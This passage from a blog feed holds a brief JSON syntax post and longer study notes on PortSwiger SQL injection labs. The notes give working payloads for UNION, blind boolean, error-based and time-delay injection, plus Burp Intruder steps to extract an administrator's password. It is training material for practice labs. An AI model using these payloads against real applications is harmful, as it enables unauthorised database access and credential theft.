punctuation">-</span>  <span class="token punctuation">-</span>     </code></pre></li></ul><h3 id="categories">Categories</h3><ul><li></li></ul><h3 id="tags">Tags</h3><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Json</title>
      <link href="/2023/03/07/json/"/>
      <url>/2023/03/07/json/</url>
      
        <content type="html"><![CDATA[<h3 id="语法格式">语法格式</h3><ul><li>JSON 的基本语法包括：</li></ul><ol type="1"><li>键/值对：键和值之间用冒号分隔，键值对之间用逗号分隔，键必须是一个字符串，值可以是任意合法的JSON 数据类型。</li><li>对象：由一组键值对组成，使用大括号 {}来表示。每个键值对之间用逗号分隔。</li><li>数组：由一组值组成，使用方括号 []来表示。每个值之间用逗号分隔。</li><li>字符串：使用双引号 " 或单引号 ' 包裹起来，表示一个字符串。</li><li>数字：表示数值，可以是整数或浮点数。</li><li>布尔值：表示真或假。</li><li>空值：表示空值的关键字为 null。</li></ol><ul><li><p>示例</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token property">"isStudent"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"courses"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"Mathematics"</span><span class="token punctuation">,</span>    <span class="token string">"Computer Science"</span><span class="token punctuation">,</span>    <span class="token string">"English"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"address"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"street"</span><span class="token operator">:</span> <span class="token string">"123 Main St"</span><span class="token punctuation">,</span>    <span class="token property">"city"</span><span class="token operator">:</span> <span class="token string">"Anytown"</span><span class="token punctuation">,</span>    <span class="token property">"state"</span><span class="token operator">:</span> <span class="token string">"CA"</span><span class="token punctuation">,</span>    <span class="token property">"zip"</span><span class="token operator">:</span> <span class="token string">"12345"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Json </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PortSwiger</title>
      <link href="/2023/03/06/portswigger/"/>
      <url>/2023/03/06/portswigger/</url>
      
        <content type="html"><![CDATA[<h3 id="top-10-web-application-security-risks">Top 10 Web ApplicationSecurity Risks</h3><ol type="1"><li><ahref="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"><strong>A01:2021-BrokenAccess Control</strong></a></li><li><ahref="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"><strong>A02:2021-CryptographicFailures</strong></a></li><li><ahref="https://owasp.org/Top10/A03_2021-Injection/"><strong>A03:2021-Injection</strong></a></li><li><ahref="https://owasp.org/Top10/A04_2021-Insecure_Design/"><strong>A04:2021-InsecureDesign</strong></a></li><li><ahref="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"><strong>A05:2021-SecurityMisconfiguration</strong></a></li><li><ahref="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"><strong>A06:2021-Vulnerableand Outdated Components</strong></a></li><li><ahref="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"><strong>A07:2021-Identificationand Authentication Failures</strong></a></li><li><ahref="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"><strong>A08:2021-Softwareand Data Integrity Failures</strong></a></li><li><ahref="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"><strong>A09:2021-SecurityLogging and Monitoring Failures</strong></a></li><li><ahref="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/"><strong>A10:2021-Server-SideRequest Forgery</strong></a></li></ol><h3 id="open-redirect">Open Redirect</h3><ol type="1"><li>As applications increasingly use <code>external data sources</code>,there's an increasing need to secure URL redirection.</li><li>By performing a redirect, attackers can steal users' credentials,redirect users to <code>phishing sites</code>, and do more maliciousthings.</li><li>Open redirection (open redirect) is classified as one of <strong>twotypes</strong>: header- and JavaScript-based, also known as type I andtype II open redirect.</li><li>Once a hacker finds and exploits this vulnerability, it's no longerjust a matter of redirection. He can perform<code>phishing attacks</code>,<code>cross-site scripting attacks</code>, and even<code>server-side request forgery attacks</code>.</li></ol><h3 id="out-of-band-application-security-testing-oast">Out-of-bandapplication security testing (OAST)</h3><ol type="1"><li>带外应用程序安全测试 (OAST) 使用<strong>外部服务器</strong>来查看其他不可见的漏洞</li></ol><h3 id="sqli">Sqli</h3><h4 id="what-is-sql-injection">What is Sql injection</h4><h5id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab:SQL injection vulnerability in WHERE clause allowing retrieval of hiddendata</h5><ol type="1"><li><p>payload<imgsrc="https://s2.loli.net/2023/07/12/Y5e4MyjpwvL8nOg.png"alt="image-20230712102850380" /></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">/</span><span class="token builtin">filter</span>?category<span class="token operator">=</span>'<span class="token operator">+</span><span class="token keyword">or</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+=</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span></code></pre></li></ol><h5 id="lab-sql-injection-vulnerability-allowing-login-bypass">Lab: SQLinjection vulnerability allowing login bypass</h5><ol type="1"><li>burp 拦截，在确定用户名通过的前提下并注释掉后面的密码审核部分<imgsrc="https://s2.loli.net/2023/07/12/dfXSQqLMvhAHsYJ.png"alt="image-20230712105439083" /></li></ol><hr /><ul><li>二次sql注入</li></ul><h5 id="lab-sql-injection-with-filter-bypass-via-xml-encoding">Lab: SQLinjection with filter bypass via XML encoding</h5><ul><li>Hackvertor插件<imgsrc="https://s2.loli.net/2023/07/12/t54TKlFbzwaugUd.png"alt="image-20230712115731699" /></li></ul><ol type="1"><li>试探性请求，被检测到sql注入<imgsrc="https://s2.loli.net/2023/07/12/4OTaqxoYblrVsUL.png"alt="image-20230712142940227" /></li><li>进行十六进制实体编码的目的是<strong>绕过</strong>Web应用程序防火墙（WAF）或其他安全机制的检测<ol type="1"><li>选中payload<imgsrc="https://s2.loli.net/2023/07/12/1vOd6QX2N7fbAkp.png"alt="image-20230712143109937" /></li><li>爆出用户名和密码<imgsrc="https://s2.loli.net/2023/07/12/49CyqUjMi6EmFQ7.png"alt="image-20230712143152966" /></li></ol></li></ol><h5 id="how-to-prevent-sql-injection">How to prevent SQL injection</h5><ul><li>prepared statements</li></ul><h4 id="examining-the-database-in-sql-injection-attacks">Examining thedatabase in SQL injection attacks</h4><h5 id="querying-the-database-type-and-version">Querying the databasetype and version</h5><ul><li><table><thead><tr class="header"><th>Database type</th><th>Query</th></tr></thead><tbody><tr class="odd"><td>Microsoft, MySQL</td><td><code>SELECT @@version</code></td></tr><tr class="even"><td>Oracle</td><td><code>SELECT * FROM v$version</code></td></tr><tr class="odd"><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table></li><li><p>example:</p><pre class="language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token comment">--</span></code></pre></li></ul><h5id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab:SQL injection attack, querying the database type and version onOracle</h5><ul><li><p>在<code>Oracle</code>数据库中，每个SELECT语句都必须指定要从中选择的表,即使目的只是为了返回一些静态值或字符串。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token string">'abc'</span> <span class="token keyword">FROM</span> dual</code></pre></li></ul><ol type="1"><li><p>Determine the <strong>number of columns</strong> that are beingreturned by the query and which columns <strong>contain textdata</strong><imgsrc="https://s2.loli.net/2023/07/13/iergKSzDkjnyxLc.png"alt="image-20230713041444814" /></p></li><li><p>burp 上是静态页面，所以send 两次即可看到solved<imgsrc="https://s2.loli.net/2023/07/13/iergKSzDkjnyxLc.png"alt="image-20230713041531099" /></p><p><strong>Payload分析</strong>：</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>BANNER<span class="token punctuation">,</span><span class="token operator">+</span><span class="token boolean">NULL</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>v$version<span class="token comment">--</span></code></pre><p>这个SQL语句是一个UNIONSELECT攻击的示例，用于从Oracle数据库的v$version视图中检索版本信息。让我们逐步解析这个语句：</p><ol type="1"><li>' 是一个单引号，用于将后面的字符串作为文本值。</li><li>UNION是用于将两个或多个SELECT语句的结果合并为一个结果集的关键字。</li><li>SELECT BANNER, NULL是第一个SELECT语句，它选择了v$version视图中的BANNER列和一个空值(NULL)作为第二列。</li><li><code>FROM v$version</code> 指定了要从v$version视图中选择数据。</li><li>--是注释符号，用于注释掉后面的任何文本，使其不会被数据库解析为有效的SQL代码。</li></ol><p>通过将这个SQL语句发送给Oracle数据库，它将执行UNION操作并将v$version视图中的版本信息与空值进行组合。</p></li></ol><h5id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">Lab:SQL injection attack, querying the database type and version on MySQLand Microsoft</h5><ol type="1"><li><p>Payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token boolean">NULL</span><span class="token comment">#</span></code></pre></li></ol><h5id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">Lab:SQL injection attack, listing the database contents on non-Oracledatabases</h5><ol type="1"><li><p>爆表</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>table_name<span class="token punctuation">,</span><span class="token operator">+</span><span class="token boolean">NULL</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment">--</span></code></pre></li><li><p>爆列</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='</span>users_abcdef'<span class="token comment">--</span></code></pre></li><li><p>指定内容</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>username_abcdef<span class="token punctuation">,</span><span class="token operator">+</span>password_abcdef<span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users_abcdef<span class="token comment">--</span></code></pre></li></ol><ul><li><p>找对表，应该是<imgsrc="https://s2.loli.net/2023/07/13/NM9qcP3QV57wRSC.png"alt="image-20230713045743852" /></p></li><li><p>以下是<code>Oracle</code>版本</p><ol type="1"><li><p>Use the following payload to retrieve the list of tables in thedatabase:</p><pre class="language-none"><code class="language-none">&#39;+UNION+SELECT+table_name,NULL+FROM+all_tables--</code></pre></li><li><p>Use the following payload (replacing the table name) to retrievethe details of the columns in the table:</p><pre class="language-none"><code class="language-none">&#39;+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name&#x3D;&#39;USERS_ABCDEF&#39;--</code></pre></li><li><p>Use the following payload (replacing the table and column names)to retrieve the usernames and passwords for all users:</p><pre class="language-none"><code class="language-none">&#39;+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--</code></pre></li></ol></li></ul><h4 id="sql-injection-union-attacks">SQL injection UNION attacks</h4><ul><li><p>为了使UNION查询生效，必须满足两个关键要求：</p><ol type="1"><li>各个查询必须返回相同数量的列。</li><li>每列的数据类型必须在各个查询之间兼容。</li></ol><p>要进行SQL注入的UNION攻击，您需要确保您的攻击满足这两个要求。这通常涉及以下几个方面：</p><ol type="1"><li>原始查询返回了多少列？</li><li>原始查询返回的哪些列的数据类型适合容纳注入查询的结果？</li></ol></li><li><p><code>ORDER BY子句</code>可以通过它们的索引来指定列，因此你不需要知道任何列的名称。当指定的列索引超过结果集中实际列的数量时，数据库会返回一个错误</p></li><li><p>在<code>MySQL</code>上，双破折号序列后必须跟一个空格。另外，井号字符#也可以用于表示注释。</p></li></ul><h4 id="blind-sql-injection">Blind SQL injection</h4><h5 id="lab-blind-sql-injection-with-conditional-responses">Lab: BlindSQL injection with conditional responses</h5><ul><li>利用Cookie中的TrackId</li></ul><ol type="1"><li><p>Modify the <code>TrackingId</code> cookie, changing it to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre><p>Verify that the "Welcome back" message appears in theresponse.</p></li><li><p>Now change it to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span></code></pre><p>Verify that the "Welcome back" message does not appear in theresponse. This demonstrates how you can test a single boolean conditionand infer the result.</p></li><li><p>Now change it to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND (SELECT '</span>a<span class="token string">' FROM users LIMIT 1)='</span>a</code></pre><p>Verify that the condition is true, confirming that there is a tablecalled <code>users</code>.</p></li><li><p>Now change it to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND (SELECT '</span>a<span class="token string">' FROM users WHERE username='</span>administrator<span class="token string">')='</span>a</code></pre><p>Verify that the condition is true, confirming that there is a usercalled <code>administrator</code>.</p></li><li><p>The next step is to determine how many characters are in thepassword of the <code>administrator</code> user. To do this, change thevalue to:</p><pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT &#39;a&#39; FROM users WHERE username&#x3D;&#39;administrator&#39; AND LENGTH(password)&gt;1)&#x3D;&#39;a</code></pre><p>This condition should be true, confirming that the password isgreater than 1 character in length.</p></li><li><p>After determining the length of the password, the next step is totest the character at each position to determine its value. Thisinvolves a much larger number of requests, so you need to use<code>Burp Intruder</code>. Send the request you are working on to BurpIntruder, using the context menu.</p></li><li><p>In the Positions tab of Burp Intruder, change the value of thecookie to:</p><pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username&#x3D;&#39;administrator&#39;)&#x3D;&#39;a</code></pre><p>This uses the <code>SUBSTRING()</code> function to extract a singlecharacter from the password, and test it against a specific value. Ourattack will cycle through each position and possible value, testing eachone in turn.</p></li><li><p>Place payload position markers around the final <code>a</code>character in the cookie value. To do this, select just the<code>a</code>, and click the "Add §" button. You should then see thefollowing as the cookie value (note the payload position markers):</p><pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username&#x3D;&#39;administrator&#39;)&#x3D;&#39;§a§</code></pre></li><li><p>To test the character at each position, you'll need to sendsuitable payloads in the payload position that you've defined. You canassume that the password contains only lowercase alphanumericcharacters. Go to the Payloads tab, check that "<strong>Simplelist</strong>" is selected, and under <strong>Payload settings</strong>add the payloads in the range a - z and 0 - 9. You can select theseeasily using the "Add from list" drop-down.</p></li><li><p>To be able to tell when the correct character was submitted,you'll need to grep each response for the expression "Welcome back". Todo this, go to the <strong>Settings</strong> tab, and the "<strong>Grep- Match</strong>" section. Clear any existing entries in the list, andthen add the value "Welcome back".</p></li><li><p>Launch the attack by clicking the "Start attack" button orselecting "Start attack" from the Intruder menu.</p></li><li><p>Review the attack results to find the value of the character atthe first position. You should see a column in the results called"Welcome back". One of the rows should have a tick in this column. Thepayload showing for that row is the value of the character at the firstposition.</p></li><li><p>Now, you simply need to re-run the attack for each of the othercharacter positions in the password, to determine their value. To dothis, go back to the main Burp window, and the Positions tab of BurpIntruder, and change the specified offset from 1 to 2. You should thensee the following as the cookie value:</p><pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username&#x3D;&#39;administrator&#39;)&#x3D;&#39;a</code></pre></li><li><p>Launch the modified attack, review the results, and note thecharacter at the second offset.</p></li><li><p>Continue this process testing offset 3, 4, and so on, until youhave the whole password.</p></li><li><p>In the browser, click "My account" to open the login page. Usethe password to log in as the <code>administrator</code> user.</p></li></ol><h5 id="lab-blind-sql-injection-with-conditional-errors">Lab: Blind SQLinjection with conditional errors</h5><ol type="1"><li><p>Modify the <code>TrackingId</code> cookie, appending a singlequotation mark to it:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz'</code></pre><p>Verify that an error message is received.</p></li><li><p>Now change it to two quotationmarks:<code>TrackingId=xyz''</code>Verify that the error disappears.This suggests that a syntax error (in this case, the unclosed quotationmark) is having a detectable effect on the response.</p></li><li><p>You now need to confirm that the server is interpreting theinjection as a SQL query i.e. that the error is a SQL syntax error asopposed to any other kind of error. To do this, you first need toconstruct a subquery using valid SQL syntax. Try submitting:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '')||'</span></code></pre><p>In this case, notice that the query still appears to be invalid. Thismay be due to the database type - try specifying a predictable tablename in the query:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '' FROM dual)||'</span></code></pre><p>As you no longer receive an error, this indicates that the target isprobably using an Oracle database, which requires all<code>SELECT</code> statements to explicitly specify a tablename.</p></li><li><p>Now that you've crafted what appears to be a valid query, trysubmitting an invalid query while still preserving valid SQL syntax. Forexample, try querying a non-existent table name:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '' FROM not-a-real-table)||'</span></code></pre><p>This time, an error is returned. This behavior strongly suggests thatyour injection is being processed as a SQL query by theback-end.</p></li><li><p>As long as you make sure to always inject syntactically valid SQLqueries, you can use this error response to infer key information aboutthe database. For example, in order to verify that the<code>users</code> table exists, send the following query:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</span></code></pre><p>As this query does not return an error, you can infer that this tabledoes exist. Note that the <code>WHERE ROWNUM = 1</code> condition isimportant here to prevent the query from returning more than one row,which would break our concatenation.</p></li><li><p>You can also exploit this behavior to test conditions. First,submit the following query:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span></code></pre><p>Verify that an error message is received.sql</p></li><li><p>Now change it to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span></code></pre><p>Verify that the error disappears. This demonstrates that you cantrigger an error conditionally on the truth of a specific condition. The<code>CASE</code> statement tests a condition and evaluates to oneexpression if the condition is true, and another expression if thecondition is false. The former expression contains a divide-by-zero,which causes an error. In this case, the two payloads test theconditions <code>1=1</code> and <code>1=2</code>, and an error isreceived when the condition is <code>true</code>.</p></li><li><p>You can use this behavior to test whether specific entries existin a table. For example, use the following query to check whether theusername <code>administrator</code> exists:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre><p>Verify that the condition is true (the error is received), confirmingthat there is a user called <code>administrator</code>.</p></li><li><p>The next step is to determine how many characters are in thepassword of the <code>administrator</code> user. To do this, change thevalue to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre><p>This condition should be true, confirming that the password isgreater than 1 character in length.</p></li><li><p>Send a series of follow-up values to test different passwordlengths. Send:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre><p>Then send:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre><p>And so on. You can do this manually using [Burp Repeater], since thelength is likely to be short. When the condition stops being true (i.e.when the error disappears), you have determined the length of thepassword, which is in fact 20 characters long.</p></li><li><p>After determining the length of the password, the next step is totest the character at each position to determine its value. Thisinvolves a much larger number of requests, so you need to use [BurpIntruder]. Send the request you are working on to Burp Intruder, usingthe context menu.</p></li><li><p>In the Positions tab of Burp Intruder, change the value of thecookie to:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN SUBSTR(password,1,1)='</span>a<span class="token string">' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre><p>This uses the <code>SUBSTR()</code> function to extract a singlecharacter from the password, and test it against a specific value. Ourattack will cycle through each position and possible value, testing eachone in turn.</p></li><li><p>Place payload position markers around the final <code>a</code>character in the cookie value. To do this, select just the<code>a</code>, and click the "Add §" button. You should then see thefollowing as the cookie value (note the payload position markers):</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN SUBSTR(password,1,1)='</span>§a§<span class="token string">' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span> </code></pre></li></ol><h5 id="lab-visible-error-based-sql-injection">Lab: Visible error-basedSQL injection</h5><ul><li>将字符串转换为其他类型会引发错误</li></ul><ol type="1"><li><p>Using Burp's built-in browser, explore the labfunctionality.</p></li><li><p>Go to the <strong>Proxy &gt; HTTP history</strong> tab and find a<code>GET /</code> request that contains a <code>TrackingId</code>cookie.</p></li><li><p>In Repeater, append a single quote to the value of your<code>TrackingId</code> cookie and send the request.</p><pre class="language-none"><code class="language-none">TrackingId&#x3D;ogAZZfxtOKUELbuJ&#39;</code></pre></li><li><p>In the response, notice the verbose error message. This disclosesthe full SQL query, including the value of your cookie. It also explainsthat you have an unclosed string literal. Observe that your injectionappears inside a single-quoted string.</p></li><li><p>In the request, add comment characters to comment out the rest ofthe query, including the extra single-quote character that's causing theerror:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ'<span class="token comment">--</span></code></pre></li><li><p>Send the request. Confirm that you no longer receive an error.This suggests that the query is now syntactically valid.</p></li><li><p>Adapt the query to include a generic <code>SELECT</code> subqueryand cast the returned value to an <code>int</code> data type:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ' <span class="token operator">AND</span> CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li><li><p>Send the request. Observe that you now get a different errorsaying that an <code>AND</code> condition must be a booleanexpression.</p></li><li><p>Modify the condition accordingly. For example, you can simply adda comparison operator (<code>=</code>) as follows:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li><li><p>Send the request. Confirm that you no longer receive an error.This suggests that this is a valid query again.</p></li><li><p>Adapt your generic <code>SELECT</code> statement so that itretrieves usernames from the database:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li><li><p>Observe that you receive the initial error message again. Noticethat your query now appears to be <strong>truncated due to a characterlimit</strong>. As a result, the comment characters you added to fix upthe query aren't included.</p></li><li><p>Delete the original value of the <code>TrackingId</code> cookieto free up some additional characters. Resend the request.</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li><li><p>Notice that you receive a new error message, which appears to begenerated by the database. This suggests that the query was runproperly, but you're still getting an error because it unexpectedlyreturned more than one row.</p></li><li><p>Modify the query to return <strong>only one row</strong>:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li><li><p>Send the request. Observe that the error message now leaks thefirst username from the <code>users</code> table:</p><pre class="language-none"><code class="language-none">ERROR: invalid input syntax for type integer: &quot;administrator&quot;</code></pre></li><li><p>Now that you know that the <code>administrator</code> is thefirst user in the table, modify the query once again to leak theirpassword:</p><pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> password <span class="token keyword">FROM</span> users <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li></ol><ul><li>当应用程序能够正确处理数据库错误时，触发SQL查询错误不会导致应用程序响应中的任何差异，因此之前诱发条件错误的技术将无法使用。</li><li>延迟SQL查询的执行也会延迟HTTP响应的到达</li></ul><h5id="lab-blind-sql-injection-with-time-delays-and-information-retrieval">Lab:Blind SQL injection with time delays and information retrieval</h5><ol type="1"><li><p>试探能否利用延迟响应</p></li><li><p>爆破密码长度 <strong>intruder</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql">x<span class="token string">'%3BSELECT+CASE+WHEN+(username='</span>administrator'<span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>LENGTH<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">THEN</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">ELSE</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">END</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users<span class="token comment">--</span></code></pre></li><li><p>爆破每个位置的字母/数字</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'%3BSELECT+CASE+WHEN+(username='</span>administrator<span class="token string">'+AND+SUBSTRING(password,1,1)='</span>a'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">THEN</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">ELSE</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">END</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users<span class="token comment">--</span></code></pre><ol type="1"><li>两处标记</li><li>攻击类型：<code>cluster bomb</code><imgsrc="https://s2.loli.net/2023/07/17/ZEIQfR1U6zKAYi2.png"alt="image-20230717182416228" /></li><li>设置2个标记<ol type="1"><li>1<imgsrc="https://s2.loli.net/2023/07/17/Sb42wQkRXALY7J8.png" 